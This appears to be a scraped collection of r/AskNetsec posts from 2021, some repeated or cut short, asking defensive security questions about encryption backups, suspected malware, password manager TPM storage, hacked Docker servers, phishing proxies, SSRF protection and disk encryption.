I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

As my title suggests, I’m really concerned i have some sort of malware, keylogger or RAT on my pc. I started noticing something was off two weeks ago when i saw that theres a file called “temp” that keeps constantly being shown on my quick access section in the file explorer, it leads to an “Asus Live Update” folder. Note that i have not opened or used this service in i dont even know how long and made sure to disable it from startup a looong time ago. I search up some of the files that were recently modified online and to my horror i find they are associated with an attack called “shadowhammer”, which is what lead me to this subreddit.

 I looked up my mac address to see if it was compropmised but it said i wasnt, i still wasnt very reassured tho. I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it. I go on the task manager to see if theres a reason this is happening and everytime i press on the performance tab, i get the blue screen of death and my pc reatarts, this still happens even now. However, one time i was able to catch a glimpse before this happened and i found i had a monitor for “Ethernet virtualbox host only network adapter”, even though i do no have a virual machines on my pc and even had virtualbox uninstalled a long time ago. I ran an ipconfig just to make sure i wasnt imaging things and it surely was there. I ran both malware bites and every scan offered by windows defender but nothing pops up for me. 

So now I’m really panicking and not sure what to do, if anyone can bring me some insight onto this, i would highly appeciated. Thanks in advance.",2021-07-02

979,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02
980,oc3u43,"Once in a while, I get into this odd phobia of someone gaining access to my accounts...","Once in a while, I get into this odd phobia of someone gaining access to my accounts, more precisely to a device I logged in and forgot to log out, or something happens to my device (lose it, break it, stolen) in which I cannot log out of it.

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

Another example, I was thinking of getting a cloud service (OneDrive) for me and my family. However, if someone steals our devices or we lose them somehow, because it connects us automatically, then it is leaving room for the stranger to steal informations or erasing everything, or even changing account securities in which we cannot get the account back.

990,p6xttl,"Are there any guidelines for how much weaker your passwords/PINs can afford to be when additional layers of protection (e.g. TPM, 2FA, key files, lockout thresholds, etc.) are present?","This might be a strange question, but I'm curious what this community thinks. In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

As a forgetful person (why I haven't switched to YubiKey) with a crap memory who's always looking for ways to make things a little simpler, I'd love to hear what this community has to say on this matter.",2021-08-18

What should I do to protect my audio privacy?","**The entirety of my privacy concerns (with regards to a smart TV) amounts to this: I don't want hackers, or Google, listening to my conversations.** That's it. I personally don't care about companies tracking what content I watch or what games I play, as there isn't any information there that would be of interest to anyone. I'm not interested in arguing about what my privacy concerns should be. I'm just looking for advice on the microphone issue.

The TV I bought is a 2021 Sony Bravia X90J with Google TV. I plan on using the Google TV OS for watching YouTube and Hulu, and for sideloading Android apps. I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

1014,oe9sx1,Is my `digital life design` good enough?,"Hi. I'm trying to organize my digital life and make it as simple as possible. I'm going to be really happy after I finalize this design. So I do appreciate your input. Especially if you are great at cyber security

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

As my title suggests, I’m really concerned i have some sort of malware, keylogger or RAT on my pc. I started noticing something was off two weeks ago when i saw that theres a file called “temp” that keeps constantly being shown on my quick access section in the file explorer, it leads to an “Asus Live Update” folder. Note that i have not opened or used this service in i dont even know how long and made sure to disable it from startup a looong time ago. I search up some of the files that were recently modified online and to my horror i find they are associated with an attack called “shadowhammer”, which is what lead me to this subreddit.

 I looked up my mac address to see if it was compropmised but it said i wasnt, i still wasnt very reassured tho. I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it. I go on the task manager to see if theres a reason this is happening and everytime i press on the performance tab, i get the blue screen of death and my pc reatarts, this still happens even now. However, one time i was able to catch a glimpse before this happened and i found i had a monitor for “Ethernet virtualbox host only network adapter”, even though i do no have a virual machines on my pc and even had virtualbox uninstalled a long time ago. I ran an ipconfig just to make sure i wasnt imaging things and it surely was there. I ran both malware bites and every scan offered by windows defender but nothing pops up for me.

1020,oc3u43,"Once in a while, I get into this odd phobia of someone gaining access to my accounts...","Once in a while, I get into this odd phobia of someone gaining access to my accounts, more precisely to a device I logged in and forgot to log out, or something happens to my device (lose it, break it, stolen) in which I cannot log out of it.

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

Another example, I was thinking of getting a cloud service (OneDrive) for me and my family. However, if someone steals our devices or we lose them somehow, because it connects us automatically, then it is leaving room for the stranger to steal informations or erasing everything, or even changing account securities in which we cannot get the account back. Especially true if the loss device is a phone and 2FA with phone number is enabled...

1021,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02

The credentials are not only stored in plain text, but also bring increased privileges. The manufacturer of the software says that this is how it is supposed to be.

I can't believe this. In my eyes, this not only violates information security principles, but is certainly illegal. I can imagine that it is a violation of the GDPR as well.

1029,p61mui,2 of my servers got hacked last night around the same time.,"2 of my servers that were running nginx and docker both got hacked by what looks like a worm of some sort about the same time.

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

&#x200B;

edit: I found a docker image common to both servers that had a default SSH password set from a well known project template.  When I logged into hacked server there were a ton of rsync processes and various nefarious processes running so first thing i did was stop the docker service to see if they stopped but they carried on with the docker service stopped.  Does this rule out this container as point of entry?

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

1045,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection.

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet. 

So what are usecases for larger organisations? How do they benefit from NBDE/PBD especially on end user machines like laptops?",2021-08-13

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

1094,oxoqy4,How vunerable to identity theft is personally identifying information sent over standard email in 2021?,"I'd value some netsec specialist views on the vulnerablity of standard email to identity theft in 2021.

Let our scenario be that an organisation, like a real estate agent or government organisation, reasonably requires personally identifying information (for example in the form of copies of a passport and birth certificate) but they solicit that information over standard email: sendocs@example.org. You send the passport and birth certificate as unencrypted email attachments.

What is the likelihood that identity thieves are able to intercept those documents? You might like to speak to factors in 2021 such as: the likelihood that email servers will have secure connections between them; the likelihood of email server hard drives being properly encrypted; or any other consideration you'd like to bring to bear.

In order to not have to dig through all results and remove false positives manually it would be extremely helpful to have open source code of which the vulnerable places are known and categorized. I know about DVWA and SARD but it would be very helpful to also have a dataset consisting of truly natural code, since it can make a difference whether you evaluate the tool on code which was specifically written for this purpose, or you use production code which was written organically.

&#x200B;

I'm a hedge fund analyst looking at a pending cybersecurity IPO. $1.4 billion valuation

I'm skeptical for several reasons but lack the technical background. Company is very heavy on buzzwords (Quantum, SaaS/PaaS, cloud, blockchain, ""deep tech"").  

The company claims ""future-proofed"" software against quantum computing, calling themselves ""a leader in quantum encryption technology"".

From what I gather, their product is a symmetric encryption method. Specifically, they claim ""Although symmetric encryption keys are secure, to date there has been no secure way to create and distribute symmetric keys electronically. Arqit’s groundbreaking technology has solved these known issues.""  (Arqit's Prospectus, page 27).

I'm very curious your take on this innovation and the market potential for this product. I have my own view, but greatly value your opinion. Cheers everyone.

My plan is to build our security infrastructure in layers to better address a lot of the attacks that seem to be taking down even large corporations and infrastructure providers.

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

Overall, does it seem like I'm heading in the right direction or are there other things I should be considering?

**Windows Authentication (Multifactor):** PIV Compatible Smart Cards Using ADCS

**User Training and Awareness Testing:** KnowBe4 Diamond with PhishER

**Endpoint Protection and EDR:** SentinelOne Singularity Complete

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

1158,p5i0db,How to keep an accurate Endpoint inventory?,"Actively managing inventory seems very important to ensure other controls can be effective.

It also helps investigating security incidents by knowing which endpoints belong to a user, what IP address it has and what OS release version it is running. Even better if these bits of information are tracked over time so that at any given time it is known what the state of the machine was (e.g. IP can change, user assigned to host can change etc). 

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection.

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet.

1181,p01812,SSH keys and Zero Trust,"I've just started reading Zero Trust Networks by Gilman & Barth.  I've been aware of the idea of Zero Trust design and some basic concepts for a while now and have been hoping to nudge things at work closer to that philosophy.  Reflecting on what I'm reading has left me wondering something.

I've generally heard that we should use SSH keys instead of interactive passwords when connecting from one Unix-like system (e.g. Linux, FreeBSD, etc.) to another because it provides better protection.  However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

I feel like I'm missing something basic here.  Any help is appreciated.",2021-08-07

Let our scenario be that an organisation, like a real estate agent or government organisation, reasonably requires personally identifying information (for example in the form of copies of a passport and birth certificate) but they solicit that information over standard email: sendocs@example.org. You send the passport and birth certificate as unencrypted email attachments.

What is the likelihood that identity thieves are able to intercept those documents?

I'm a hedge fund analyst looking at a pending cybersecurity IPO. $1.4 billion valuation

The company claims ""future-proofed"" software against quantum computing, calling themselves ""a leader in quantum encryption technology"".

From what I gather, their product is a symmetric encryption method. Specifically, they claim ""Although symmetric encryption keys are secure, to date there has been no secure way to create and distribute symmetric keys electronically. Arqit’s groundbreaking technology has solved these known issues.""  (Arqit's Prospectus, page 27).

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant.

1229,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22
1230,op0a1s,[Question] Deploying smokescreen to prevent SSRF,"I've been experimenting with smokescreen to handle SSRF attacks on internal infrastructure. The thing is that the service I'm working with needs to communicate with some parts of the internal infrastructure for things like authentication. Smokescreen by default blocks all connections to RFC 1918 addresses. An idea I had was to create a whitelist for internal ip addresses but I can't help but wonder if that defeats the whole purpose of a SSRF protection proxy as there are still some internal traffic allowed.

1251,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

But this doesn't add up to me. It's not like the traffic is physically going down a different circuit. **The CPU has to determine where all tagged traffic goes -- be it on the same VLAN or a different one, right?**

I'd like to ask you for some help in planning a strategy.

My team provides an internal service to my company, which isn't exposed to our clients. We provide the teams a RESTful API, and a private key to verify the API.

Our current method is not recommended, we uploaded the key file to a Sharepoint and anyone with access to it can download the key file. But it feels wrong to distribute a key this way.

1274,p61mui,2 of my servers got hacked last night around the same time.,"2 of my servers that were running nginx and docker both got hacked by what looks like a worm of some sort about the same time.

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

&#x200B;

edit: I found a docker image common to both servers that had a default SSH password set from a well known project template.  When I logged into hacked server there were a ton of rsync processes and various nefarious processes running so first thing i did was stop the docker service to see if they stopped but they carried on with the docker service stopped.  Does this rule out this container as point of entry?

We at r/AskNetsec would like to introduce you to our new ""Segment"" State Of the Sub, For the next few months, this will be released at the end of each month as a way of transparency between the mod team and you guys.

&#x200B;

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

&#x200B;

That's all for today folks, I hope you've all had a good weekend and I'll see you all again next month.",2021-08-16
1279,p5i0db,How to keep an accurate Endpoint inventory?,"Actively managing inventory seems very important to ensure other controls can be effective.

It also helps investigating security incidents by knowing which endpoints belong to a user, what IP address it has and what OS release version it is running. Even better if these bits of information are tracked over time so that at any given time it is known what the state of the machine was (e.g. IP can change, user assigned to host can change etc). 

Are there any good supporting tools that can keep a dynamic inventory? 

